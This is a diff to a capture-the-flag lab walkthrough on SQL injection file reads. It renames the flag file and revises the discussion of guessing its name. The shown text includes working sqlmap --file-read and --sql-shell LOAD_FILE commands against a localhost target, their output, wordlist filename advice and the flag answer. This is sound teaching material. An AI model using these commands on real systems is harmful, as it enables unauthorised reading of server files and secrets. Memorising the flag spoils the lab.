@@ -91,22 +91,21 @@ On a real engagement, closing that gap means one of: a filename you
 already have from other recon (source disclosure, a backup script's
 naming convention, an error message elsewhere), or brute-forcing a
 wordlist of likely names against `LOAD_FILE()`, slow and noisy, but the
-honest fallback when you have nothing better. A wordlist seeded from the
-target's own theme (here, "groundskeeper" is straight out of this
-floor's own name and flavor text) is a real, legitimate way to narrow
-that search, the same instinct that finds `resonance` in the Echo
-Chamber's wordlist. It only gets you half of this filename, though:
-`groundskeeper.flag` is the only `.flag`-extension file anywhere in this
-lab, every other floor's flag lives in a table, so nothing here
-establishes that extension as a pattern worth guessing. The word is a
-fair theme-based guess; the exact filename, word plus extension, still
-isn't. This floor hands you `groundskeeper.flag` directly, in the
-briefing and here, on purpose: the
-lesson is what an uncontainable global `FILE` grant lets an
-already-confirmed injection reach, not the separate, much harder skill
-of blind file enumeration. Read the clean `--file-read` command below as
-"here is what that access lets you do once you have a target path", not
-as "here is how you'd have found that path with nothing else to go on".
+honest fallback when you have nothing better. `secret.txt` is
+deliberately named to make that second path a fair one here: it's the
+same name every other floor in this lab already uses for its hidden
+value (`echo_vault.secret`, `cell_records.secret`, and so on, this floor
+just happens to keep its `secret` in a file instead of a column), and
+it's also one of the first names any real `--file-read`/LFI wordlist
+tries (`secret.txt`, `flag.txt`, `flag`, `credentials.txt` are
+standard entries in exactly that kind of list). A player who's noticed
+the lab's own naming habit, or who just brings a normal file-read
+wordlist to this floor, has a genuinely fair shot at this filename
+without ever being told it. That's different from actually deriving it
+from the injection itself, sqlmap's own recon still can't hand it to
+you, `LOAD_FILE()` gives no directory listing, so `--search`-style
+discovery has no equivalent here; a wordlist guess and a query result
+are not the same kind of "found."
 
 ## The technique: reading (and writing) files through the injection
 
@@ -117,17 +116,17 @@ technique is active, UNION here) and saving a local copy:
 
 ```
 sqlmap -u "http://localhost:8000/p2/keys?id=1" -p id --batch --ignore-stdin \
-    --file-read="/var/lib/mysql-files/groundskeeper.flag"
+    --file-read="/var/lib/mysql-files/secret.txt"
 ```
 
 Real output from this exact seed:
 
 ```
-[INFO] fetching file: '/var/lib/mysql-files/groundskeeper.flag'
-do you want confirmation that the remote file '/var/lib/mysql-files/groundskeeper.flag' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
-[INFO] the local file '.../files/_var_lib_mysql-files_groundskeeper.flag' and the remote file '/var/lib/mysql-files/groundskeeper.flag' have the same size (37 B)
+[INFO] fetching file: '/var/lib/mysql-files/secret.txt'
+do you want confirmation that the remote file '/var/lib/mysql-files/secret.txt' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
+[INFO] the local file '.../files/_var_lib_mysql-files_secret.txt' and the remote file '/var/lib/mysql-files/secret.txt' have the same size (37 B)
 files saved to [1]:
-[*] /home/kali/.local/share/sqlmap/output/localhost/files/_var_lib_mysql-files_groundskeeper.flag (same file)
+[*] /home/kali/.local/share/sqlmap/output/localhost/files/_var_lib_mysql-files_secret.txt (same file)
 ```
 
 The saved file's contents, verified live:
@@ -144,14 +143,14 @@ It's normally interactive, but piping a query in over stdin drives it
 non-interactively too (this is exactly what `solvers/p2_8.sh` does):
 
 ```
-echo "SELECT LOAD_FILE('/var/lib/mysql-files/groundskeeper.flag');" | \
+echo "SELECT LOAD_FILE('/var/lib/mysql-files/secret.txt');" | \
     sqlmap -u "http://localhost:8000/p2/keys?id=1" -p id --batch --ignore-stdin --sql-shell
 ```
 
 ```
 [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
 sql-shell> [INFO] fetching SQL SELECT statement query output: 'SELECT LOAD_FILE(...)'
-SELECT LOAD_FILE('/var/lib/mysql-files/groundskeeper.flag'): 'SEIYAKU{file_privilege_has_no_walls}\n'
+SELECT LOAD_FILE('/var/lib/mysql-files/secret.txt'): 'SEIYAKU{file_privilege_has_no_walls}\n'
 ```
 
 Same flag, same underlying privilege, a different way of asking for it,
